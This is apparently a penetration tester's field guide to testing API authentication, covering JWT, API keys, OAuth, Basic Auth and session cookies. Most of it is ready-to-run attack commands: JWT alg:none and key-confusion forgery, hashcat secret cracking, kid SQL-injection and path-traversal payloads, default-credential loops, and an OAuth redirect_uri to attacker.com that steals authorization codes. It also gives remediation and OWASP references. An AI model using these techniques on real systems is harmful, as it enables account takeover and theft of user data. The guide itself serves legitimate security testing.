# API Authentication Methods — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** API Security — Authentication & Token Testing
>
> **Context:** API authentication is the single most consequential security control in any enterprise application. Break the authentication mechanism and you own the application — without needing to exploit a single injection vulnerability. In five years of enterprise API testing, I have found weak JWT secrets in production, OAuth state bypass vulnerabilities in SSO integrations, API keys hardcoded in mobile app bundles, and session tokens that survive logout indefinitely. This document covers every authentication method I encounter in enterprise APIs and how I test each one.

---

## 🔍 Authentication Method Detection

Before testing, identify exactly which authentication mechanism is in use.

```bash
# Examine the login response carefully:
curl -sv https://api.company.com/api/v1/auth/login \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Test123!"}' 2>&1

# What to look for in the response:
#
# Bearer token in body:
# {"access_token": "eyJhbGci...", "refresh_token": "..."}
# → JWT or opaque bearer token authentication
#
# Cookie in Set-Cookie header:
# Set-Cookie: session=eyJhbGci...; HttpOnly; Secure; SameSite=Strict
# → Cookie-based session management
#
# API key in response:
# {"api_key": "sk_live_abc123xyz"}
# → API key issued at login
#
# Short code reference:
# {"session_id": "550e8400-e29b-41d4-a716"}
# → Server-side session with opaque ID

# Then examine subsequent API calls:
# Authorization: Bearer eyJhbGci... → JWT/OAuth Bearer token
# Authorization: Basic YWRtaW4... → Basic Auth (base64 username:password)
# X-API-Key: sk_live_abc123        → API Key in custom header
# Cookie: session=...              → Cookie-based session
```

---

## 🔐 Authentication Type 1 — JWT (Bearer Token)

The most common enterprise API authentication type. Also the richest attack surface.

### Understanding the JWT Structure

```
JWT = three Base64url-encoded segments separated by dots:

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9           ← Header
.eyJ1c2VySWQiOjEwOTksInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzE0OTA5MjAwfQ  ← Payload
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c   ← Signature

Decoded Header:  {"alg": "HS256", "typ": "JWT"}
Decoded Payload: {"userId": 1099, "role": "user", "exp": 1714909200}

The payload is NOT encrypted — only Base64-encoded.
Anyone who intercepts the JWT can read it.
The signature prevents MODIFICATION only — if the secret is weak or validation fails, it is bypassable.
```

### Attack 1 — Algorithm None

```bash
# Manually craft a token with no signature requirement

# Step 1: Decode the original header
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# → {"alg":"HS256","typ":"JWT"}

# Step 2: Create modified header with alg:none
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '='
# → eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# Step 3: Modify payload — escalate to admin
echo -n '{"userId":1099,"role":"admin","exp":9999999999}' | base64 | tr '+/' '-_' | tr -d '='
# → eyJ1c2VySWQiOjEwOTksInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0

# Step 4: Build token — header.payload. (empty signature, trailing dot)
FORGED="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEwOTksInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0."

# Step 5: Send to admin endpoint
curl -s https://api.company.com/api/v1/admin/users \
  -H "Authorization: Bearer $FORGED" | jq .

# If admin data returned = Critical — alg:none accepted

# Also try: "NONE", "None", "" (empty string)

# Using Burp JWT Editor extension (faster):
# JWT Editor tab → Attacks → None Signing Algorithm → Send
```

### Attack 2 — Weak Secret Brute Force

```bash
# Save the full JWT token from Burp to a file:
echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEwOTl9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" > jwt.txt

# Brute force with hashcat:
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --force

# Also test enterprise-specific secrets:
cat > enterprise_jwt_secrets.txt << 'EOF'
secret
password
changeme
jwt_secret
jwttoken
myapp
company
infosys
1234567890
your-256-bit-secret
supersecret
qwerty
admin
token
appname
mysecret
EOF

hashcat -a 0 -m 16500 jwt.txt enterprise_jwt_secrets.txt --force

# If cracked (e.g. secret = "company2024"):
# Now forge any token:
python3 << 'PYEOF'
import jwt, json
payload = {"userId": 1, "role": "admin", "exp": 9999999999}
token = jwt.encode(payload, "company2024", algorithm="HS256")
print(token)
PYEOF
```

### Attack 3 — RS256 to HS256 Algorithm Confusion

```bash
# If the server uses RS256 (asymmetric), the public key is often retrievable.
# Attack: Switch to HS256 and sign with the PUBLIC KEY as the HMAC secret.

# Step 1: Get the public key
curl -s https://api.company.com/.well-known/jwks.json
# Or: GET /api/auth/keys  |  GET /.well-known/openid-configuration

# Step 2: Extract and format the public key as PEM
# (many JWKS-to-PEM conversion tools available: python-jose, node-jose)

# Step 3: Forge token
python3 << 'PYEOF'
import jwt
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqh...
-----END PUBLIC KEY-----"""
payload = {"userId": 1, "role": "admin", "exp": 9999999999}
# Sign with HS256 using public key as secret:
token = jwt.encode(payload, public_key, algorithm="HS256")
print(token)
PYEOF

# Step 4: Send forged token — if accepted = Critical
curl -s https://api.company.com/api/v1/admin/users \
  -H "Authorization: Bearer [FORGED_TOKEN]" | jq .
```

### Attack 4 — kid (Key ID) Header Injection

```bash
# If JWT header contains "kid" parameter:
# {"alg":"HS256","typ":"JWT","kid":"keys/signing-key.pem"}

# SQL Injection via kid:
# Forge header: {"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'attacker_key'-- -"}
# Server executes: SELECT key FROM keys WHERE id = '...' → returns 'attacker_key'
# Sign the JWT with 'attacker_key'

# Path Traversal via kid:
# {"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
# Server reads /dev/null = empty string as signing key
# Sign JWT with empty string "" → token accepted

# Using Burp JWT Editor:
# JWT Editor → Edit Header → add/modify "kid" value → sign with target key
```

### Attack 5 — Claim Manipulation (No Signature Bypass)

```bash
# Test if server validates the signature at all
# Modify payload, keep original signature

# Decode payload → modify role → re-encode → keep original signature
HEADER="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
NEW_PAYLOAD=$(echo -n '{"userId":1099,"role":"admin","exp":9999999999}' | \
  base64 | tr '+/' '-_' | tr -d '=')
ORIGINAL_SIG="SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

TAMPERED="${HEADER}.${NEW_PAYLOAD}.${ORIGINAL_SIG}"

curl -s https://api.company.com/api/v1/users/me \
  -H "Authorization: Bearer $TAMPERED" | jq .

# If server returns data = signature not validated = Critical
# Less common but catastrophic when found
```

---

## 🔐 Authentication Type 2 — API Keys

### Testing Strategies

```bash
# Test 1: API key in URL (information disclosure)
# If API key is in URL parameters → it appears in server logs, browser history
curl -s "https://api.company.com/v1/reports?api_key=sk_live_abc123xyz"
# Report: API key in URL = information disclosure finding

# Test 2: Find API keys in JavaScript bundles
curl -s https://app.company.com/static/js/main.chunk.js | \
  grep -iE "(api_key|apiKey|api-key|access_key|secret_key)\s*[:=]\s*['\"][A-Za-z0-9_-]{15,}"

# Test 3: API key entropy analysis
# Weak keys: sk_12345, abc_xyz, key_password
# Strong keys: random, 32+ chars, opaque
# Low entropy key = brute forceable with targeted wordlist

# Test 4: Key scope — what does this key have access to?
# Try the API key against admin endpoints:
curl -s https://api.company.com/api/v1/admin/users \
  -H "X-API-Key: DISCOVERED_KEY"
# If admin data returned = key over-scoped = High finding

# Test 5: Key revocation — does old key still work after rotation?
# Use an old API key from changelog, documentation, or git history
# If still valid = key revocation not enforced

# Test 6: Unauthenticated API key generation
# POST /api/keys without being authenticated → if key issued = Critical
curl -s -X POST https://api.company.com/api/v1/keys \
  -H "Content-Type: application/json" \
  -d '{"name":"test","scope":"admin"}'
```

---

## 🔐 Authentication Type 3 — OAuth 2.0 / SSO

### OAuth Flow Security Testing

```bash
# Step 1: Capture the OAuth authorization URL
# https://auth.company.com/oauth/authorize
#   ?client_id=app_client_123
#   &response_type=code
#   &redirect_uri=https://app.company.com/oauth/callback
#   &scope=read:profile%20read:orders
#   &state=RANDOM_CSRF_TOKEN    ← this is the CSRF protection

# Test 1: Missing or predictable state parameter
# If state is absent → CSRF attack on OAuth flow possible
# If state is predictable (sequential, timestamp) → forgeable

# Test 2: Open redirect in redirect_uri
curl -sv "https://auth.company.com/oauth/authorize?\
client_id=app_client_123&\
response_type=code&\
redirect_uri=https://attacker.com/steal&\
state=abc123" 2>&1 | grep -i location

# If redirect to attacker.com = authorization code stolen = ATO

# Test 3: redirect_uri manipulation
# Original: &redirect_uri=https://app.company.com/callback
# Try:
#   &redirect_uri=https://app.company.com.attacker.com/callback
#   &redirect_uri=https://app.company.com/callback/../../../attacker
#   &redirect_uri=https://app.company.com%2Fcallback%40attacker.com

# Test 4: Scope escalation
# Request scope beyond what should be allowed:
# &scope=read:profile%20write:admin%20delete:all
# If elevated scope granted in token = scope validation missing

# Test 5: Authorization code replay
# Step 1: Complete OAuth flow → get callback with ?code=ABC123
# Step 2: Visit the callback URL again with same code
# If second use succeeds = authorization codes not single-use
```

---

## 🔐 Authentication Type 4 — Basic Authentication

```bash
# Basic auth: base64(username:password) in Authorization header
# Authorization: Basic YWRtaW46YWRtaW4=

# Decode to verify:
echo "YWRtaW46YWRtaW4=" | base64 -d
# → admin:admin (default credentials!)

# Test common defaults on every HTTP Basic Auth prompt:
for cred in "admin:admin" "admin:password" "admin:1234" \
            "root:root" "administrator:administrator" \
            "user:user" "guest:guest" "test:test"; do
  encoded=$(echo -n "$cred" | base64)
  code=$(curl -so /dev/null -w "%{http_code}" \
    https://api.company.com/admin/ \
    -H "Authorization: Basic $encoded")
  echo "$cred: HTTP $code"
done

# Test platform defaults:
# Apache .htaccess: admin:admin, webmaster:webmaster
# nginx_status: no auth common
# Grafana: admin:admin (changed at first login — but often not changed)

# Critical check: is Basic Auth used over HTTP (not HTTPS)?
curl -sI http://target.company.com/api/ | grep -i "www-authenticate"
# If WWW-Authenticate: Basic returned over HTTP = cleartext credentials
```

---

## 🔐 Authentication Type 5 — Session Cookies (Cookie-Based Auth)

```bash
# After login, check Set-Cookie header in response:
curl -sv -X POST https://app.company.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Test123!"}' 2>&1 | \
  grep -i "set-cookie"

# Security attribute checklist for every session cookie:
# Set-Cookie: session=eyJhbGci...; HttpOnly; Secure; SameSite=Strict; Path=/

# HttpOnly missing → JS can steal: document.cookie → XSS to ATO chain
# Secure missing   → Cookie transmitted over HTTP → interception risk
# SameSite missing → CSRF attacks viable on all state-changing endpoints

# Test 1: Session fixation
# Note cookie value BEFORE login
# After login — compare cookie value
# Same before and after = session fixation vulnerability

# Test 2: Session invalidation after logout
# Step 1: Login → save session cookie value
# Step 2: Logout via application
# Step 3: Replay saved cookie in new request
curl -s https://app.company.com/api/v1/users/me \
  -H "Cookie: session=SAVED_SESSION_VALUE" | jq .
# If 200 returned = session not invalidated server-side = finding

# Test 3: Cookie value analysis
# Base64-decode the cookie value
echo "eyJ1c2VySWQiOjEwOTl9" | base64 -d
# If readable user data (userId, role, isAdmin) = decode + modify
# → Submit modified cookie → privilege escalation
```

---

## 🗂️ Authentication Testing Checklist

```
JWT TOKENS
☐ Decode at jwt.io → inspect all claims, algorithm, expiry
☐ Algorithm none attack (all case variants: none, NONE, None)
☐ Weak secret: hashcat -m 16500 jwt.txt rockyou.txt
☐ RS256→HS256 confusion if public key discoverable
☐ kid injection if kid parameter present in header
☐ Expired token replay (log out, use old token)
☐ Token reuse after account deletion

API KEYS
☐ Is key in URL parameters? (log exposure)
☐ Search JS bundles for hardcoded keys
☐ Test key against admin endpoints (over-scoping)
☐ Test key revocation (old keys from git history)

OAUTH / SSO
☐ state parameter present and validated?
☐ redirect_uri strict match enforced?
☐ Authorization codes single-use?
☐ Scope escalation: request admin scope
☐ OAuth CSRF if state missing/predictable

BASIC AUTH
☐ Test default credentials (admin:admin, root:root)
☐ Is Basic Auth over HTTP? (cleartext exposure)

SESSION COOKIES
☐ HttpOnly flag present?
☐ Secure flag present?
☐ SameSite=Strict or Lax present?
☐ Session invalidated after logout?
☐ Session fixation (same ID before/after login)?
☐ Cookie value contains readable/modifiable data?
```

---

## 📋 Enterprise Report Template

**Finding Title:** JWT Signing Secret Cracked — Administrative Token Forgery Possible

**Severity:** Critical | **CVSS v3.1:** 9.8

```
JWT Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.[payload].[signature]
Algorithm: HS256

Cracking command:
  hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
  
Result:
  Cracked in 47 seconds
  Secret: "company2024"

Forged administrator token (Python):
  import jwt
  payload = {"userId": 1, "role": "admin", "exp": 9999999999}
  token = jwt.encode(payload, "company2024", algorithm="HS256")

Verification:
  curl -s https://api.company.com/api/v1/admin/users \
    -H "Authorization: Bearer [FORGED_TOKEN]" | jq '. | length'
  → Returns 4200 (all user records — admin access confirmed)

Remediation:
  Generate cryptographically random JWT secret: openssl rand -hex 64
  Minimum 256 bits of entropy (32 bytes random)
  Store in secrets manager (AWS Secrets Manager, Azure Key Vault)
  Never hardcode in application.properties or environment variable files
  Rotate immediately — all existing tokens are compromised
```

---

## 🧭 Key Takeaways

**1. JWT weak secrets are endemic in enterprise Java applications.**
Early Spring Boot tutorials used `"secret"` as the example JWT signing key. Many production applications were built from those tutorials. Hashcat with rockyou.txt against HS256 JWTs takes minutes and succeeds on a surprisingly high percentage of enterprise apps. Always test this.

**2. OAuth state parameter absence is an enterprise-specific finding.**
Consumer apps mostly have proper state parameter validation. Enterprise applications that built their own SSO integration, or integrated a third-party IdP quickly under deadline, frequently miss state parameter validation. The impact is account takeover via CSRF on the OAuth callback — always test it.

**3. Test session invalidation every time — it is consistently broken in JWT apps.**
When developers switch from cookie-based sessions to JWT, they often implement "logout" as simply deleting the token from localStorage. The token itself remains valid until its `exp` claim expires (often 24+ hours). Always save a token, log out, and replay it.

**4. API keys in JavaScript bundles are still a common Critical finding.**
Developers hardcode API keys during development and ship them to production in the minified JavaScript bundle. Tools like JS Miner in Burp, or a simple grep on the JS file, finds these in minutes. Always check JS bundles for any string matching `api_key`, `secret`, `AKIA`, or `Bearer`.

---

## 🔗 References
- [OWASP API2:2023 — Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
- [OAuth 2.0 Security Best Practices](https://datatracker.ietf.org/doc/html/rfc9700)
- [JWT.io](https://jwt.io)

---
<div align="center">

*Part of [AppSec From The Trenches](../README.md) — Real notes from 5+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
